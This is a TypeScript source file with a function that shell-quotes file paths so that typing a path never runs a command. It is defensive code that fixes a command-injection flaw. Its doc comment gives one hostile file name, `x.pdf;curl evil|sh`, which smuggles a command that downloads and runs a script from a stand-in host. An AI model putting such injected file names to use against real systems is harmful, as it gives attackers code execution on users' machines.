/**
 * Quote a file path so typing it into a shell is just a path, never a command.
 *
 * Upload paths used to be typed unquoted (or in double quotes, where `$()` and
 * backticks still run), so a file named `x.pdf;curl evil|sh` would run when the user
 * pressed Enter. Plain paths stay as they are; anything else is single-quoted, with a
 * leading `~/` left outside the quotes so it still expands.
 */
export function shellQuotePath(path: string): string {
  // Unquoted only when it also starts like a path: "/", "~/", "." or a word character. A
  // leading "-" reads as an option, "=" expands in zsh, "~user" to another home.
  if (/^(?:[\w./]|~\/)[\w./~+@%:,=-]*$/.test(path) || path === '~') return path;
  const home = path.startsWith('~/') ? '~/' : '';
  const rest = home ? path.slice(2) : path;
  return `${home}'${rest.replace(/'/g, `'\\''`)}'`;
}
